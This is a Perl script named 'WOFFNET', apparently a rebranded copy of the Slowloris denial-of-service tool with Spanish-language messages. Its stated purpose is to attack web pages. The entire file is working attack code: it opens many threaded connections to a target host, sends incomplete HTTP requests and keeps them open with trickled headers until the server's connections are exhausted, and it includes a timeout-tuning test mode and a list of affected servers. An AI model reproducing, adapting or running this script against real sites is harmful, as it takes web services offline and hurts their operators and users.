#!/usr/bin/perl -w
#SCRIPT BASE: SLOWLORIS

use strict;
use IO::Socket::INET;
#use IO::Socket::SSL;
use Getopt::Long;
use Config;

$SIG{'PIPE'} = 'IGNORE';

print <<EOTEXT;
###################################################
               WOFFN3T BY TKN3T
###################################################
EOTEXT

my ( $host, $port, $sendhost, $shost, $test, $version, $timeout, $connections );
my ( $cache, $httpready, $method, $ssl, $rand, $tcpto );
my $result = GetOptions(
    'shost=s'   => \$shost,
    'h=s'     => \$host,
	'p=i'    => \$port,
	'host=s'    => \$host,
    'httpready' => \$httpready,
    'num=i'     => \$connections,
    'cache'     => \$cache,
    'port=i'    => \$port,
    'https'     => \$ssl,
    'tcpto=i'   => \$tcpto,
    'test'      => \$test,
    'timeout=i' => \$timeout,
    'version'   => \$version,
);

if ($version) {
    print "v1.0\n";
    exit;
}

unless ($host) {
    print "Uso:\n\n\tperl $0 -h [url/ip] -p [puerto]\n";
    print "\n\tURL: www.ejemplo.com - IP: 0.0.0.0 - PUERTO: 80\n\n";
    exit;
}

unless ($port) {
    print "Uso:\n\n\tperl $0 -h [url/ip] -p [puerto]\n";
    print "\n\tURL: www.ejemplo.com - IP: 0.0.0.0 - PUERTO: 80\n\n";
    #$port = 80;
    exit;
}
unless ($tcpto) {
    $tcpto = 5;
    #print "De forma predeterminada a un tiempo de espera de conexión tcp de 5 segundos.\n";
}

unless ($test) {
    unless ($timeout) {
        $timeout = 10;
        #print "De forma predeterminada a un tiempo de espera de reintento de 100 segundos.\n";
    }
    unless ($connections) {
        $connections = 1000;
        #print "Predeterminado a 1000 conexiones.\n";
    }
}

my $usemultithreading = 0;
if ( $Config{usethreads} ) {
    #print "Multihilo habilitado.\n";
    $usemultithreading = 1;
    use threads;
    use threads::shared;
}
else {
    print "No se han encontrado capacidades de multihilo!\n";
    print "WOFFNET será más lento de lo normal como resultado.\n";
}

my $packetcount : shared     = 0;
my $failed : shared          = 0;
my $connectioncount : shared = 0;

srand() if ($cache);

if ($shost) {
    $sendhost = $shost;
}
else {
    $sendhost = $host;
}
if ($httpready) {
    $method = "POST";
}
else {
    $method = "GET";
}

if ($test) {
    my @times = ( "2", "30", "90", "240", "500" );
    my $totaltime = 0;
    foreach (@times) {
        $totaltime = $totaltime + $_;
    }
    $totaltime = $totaltime / 60;
    print "Esta prueba podría tomar hasta $totaltime.\n";

    my $delay   = 0;
    my $working = 0;
    my $sock;

    if ($ssl) {
        if (
            $sock = new IO::Socket::SSL(
                PeerAddr => "$host",
                PeerPort => "$port",
                Timeout  => "$tcpto",
                Proto    => "tcp",
            )
          )
        {
            $working = 1;
        }
    }
    else {
        if (
            $sock = new IO::Socket::INET(
                PeerAddr => "$host",
                PeerPort => "$port",
                Timeout  => "$tcpto",
                Proto    => "tcp",
            )
          )
        {
            $working = 1;
        }
    }
    if ($working) {
        if ($cache) {
            $rand = "?" . int( rand(99999999999999) );
        }
        else {
            $rand = "";
        }
        my $primarypayload =
            "GET /$rand HTTP/1.1\r\n"
          . "Host: $sendhost\r\n"
          . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
          . "Content-Length: 42\r\n";
        if ( print $sock $primarypayload ) {
            print "La conexión fue éxitosa, paquetes enviados.\n";
        }
        else {
            print
"La conexión fue éxitosa, pero no se pueden enviar paquetes a $host:$port.\n";
            print "¿Hay algo mal?\nDying.\n";
            exit;
        }
    }
    else {
        print "La conexión no se pudo completar, imposible conectar a $host:$port.\n";
        print "¿Hay algo mal?\nDying.\n";
        exit;
    }
    for ( my $i = 0 ; $i <= $#times ; $i++ ) {
        print "Intentando un $times[$i] segundo retraso: \n";
        sleep( $times[$i] );
        if ( print $sock "X-a: b\r\n" ) {
            print "\tTrabajó.\n";
            $delay = $times[$i];
        }
        else {
            if ( $SIG{__WARN__} ) {
                $delay = $times[ $i - 1 ];
                last;
            }
            print "\tFalló después $times[$i] segundos.\n";
        }
    }

    if ( print $sock "Conexión: Cerrar\r\n\r\n" ) {
        print "Se determinó que WOFFNET se usó bastante tiempo por lo tanto se ha cerrado.\n";
        print "Usa $delay seconds para -timeout.\n";
        exit;
    }
    else {
        print "Servidor remoto cerrado socket.\n";
        print "Usa $delay seconds para -timeout.\n";
        exit;
    }
    if ( $delay < 166 ) {
        print <<EOSUCKS2BU;
Dado que el tiempo de espera terminó siendo tan pequeño ($timeout segundos de retardo) y generalmente
toma entre 200 y 500 subprocesos para la mayoría de los servidores y asumiendo cualquier latencia en
todo ... puede que tengas problemas para usar Slowloris contra este objetivo. Usted puede
retoque la marca de tiempo de espera a menos de 10 segundos, pero aún así puede que no
construir las tomas en el tiempo.
EOSUCKS2BU
    }
}
else {
    print
"Iniciando ataque a $host:$port cada $timeout segundos con $connections conexiones.";
#Conectando a $host:$port cada $timeout segundos con $connections sockets:\n

    if ($usemultithreading) {
        domultithreading($connections);
    }
    else {
        doconnections( $connections, $usemultithreading );
    }
}

sub doconnections {

    my ( $num, $usemultithreading ) = @_;
    my ( @first, @sock, @working );
    my $failedconnections = 0;
    $working[$_] = 0 foreach ( 1 .. $num );    #initializing
    $first[$_]   = 0 foreach ( 1 .. $num );    #initializing
    while (1) {
        $failedconnections = 0;
        #print "\t\tDesarrollando sockets.\n";
        foreach my $z ( 1 .. $num ) {
            if ( $working[$z] == 0 ) {
                if ($ssl) {
                    if (
                        $sock[$z] = new IO::Socket::SSL(
                            PeerAddr => "$host",
                            PeerPort => "$port",
                            Timeout  => "$tcpto",
                            Proto    => "tcp",
                        )
                      )
                    {
                        $working[$z] = 1;
                    }
                    else {
                        $working[$z] = 0;
                    }
                }
                else {
                    if (
                        $sock[$z] = new IO::Socket::INET(
                            PeerAddr => "$host",
                            PeerPort => "$port",
                            Timeout  => "$tcpto",
                            Proto    => "tcp",
                        )
                      )
                    {
                        $working[$z] = 1;
                        $packetcount = $packetcount + 3;  #SYN, SYN+ACK, ACK
                    }
                    else {
                        $working[$z] = 0;
                    }
                }
                if ( $working[$z] == 1 ) {
                    if ($cache) {
                        $rand = "?" . int( rand(99999999999999) );
                    }
                    else {
                        $rand = "";
                    }
                    my $primarypayload =
                        "$method /$rand HTTP/1.1\r\n"
                      . "Host: $sendhost\r\n"
                      . "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
                      . "Content-Length: 42\r\n";
                    my $handle = $sock[$z];
                    if ($handle) {
                        print $handle "$primarypayload";
                        if ( $SIG{__WARN__} ) {
                            $working[$z] = 0;
                            close $handle;
                            $failed++;
                            $failedconnections++;
                        }
                        else {
                            $packetcount++;
                            $working[$z] = 1;
                        }
                    }
                    else {
                        $working[$z] = 0;
                        $failed++;
                        $failedconnections++;
                    }
                }
                else {
                    $working[$z] = 0;
                    $failed++;
                    $failedconnections++;
                }
            }
        }
        #print "\t\tENVIANDO DATOS.\n";
        foreach my $z ( 1 .. $num ) {
            if ( $working[$z] == 1 ) {
                if ( $sock[$z] ) {
                    my $handle = $sock[$z];
                    if ( print $handle "X-a: b\r\n" ) {
                        $working[$z] = 1;
                        $packetcount++;
                    }
                    else {
                        $working[$z] = 0;
                        #debugging info
                        $failed++;
                        $failedconnections++;
                    }
                }
                else {
                    $working[$z] = 0;
                    #debugging info
                    $failed++;
                    $failedconnections++;
                }
            }
        }
        #print
#"Estadísticas actuales:\n \tWOFFNET ha enviado paquetes de $ packetcount con éxito. \nEsta cadena ahora está durmiendo por $timeout segundos de tiempo de espera ...\n\n";
        sleep($timeout);
    }
}

sub domultithreading {
    my ($num) = @_;
    my @thrs;
    my $i                    = 0;
    my $connectionsperthread = 50;
    while ( $i < $num ) {
        $thrs[$i] =
          threads->create( \&doconnections, $connectionsperthread, 1 );
        $i += $connectionsperthread;
    }
    my @threadslist = threads->list();
    while ( $#threadslist > 0 ) {
        $failed = 0;
    }
}

__END__
=head1 TITLE
WOFFNET BY TKN3T
=head1 VERSION
v1.0 Beta
=head1 DATE
12/01/2019
=head1 AUTHOR
TKN3T
=head1 ABSTRACT
Script diseñado para atacar página web's. Slowloris como base script.
=head1 AFFECTS
Apache 1.x, Apache 2.x, dhttpd, GoAhead WebServer, others...? - EN LOS FUNCIONA EL SCRIPT
=head1 NOT AFFECTED
IIS6.0, IIS7.0, lighttpd, nginx, Cherokee, Squid, others...? - EN LOS QUE NO FUNCIONA EL SCRIPT
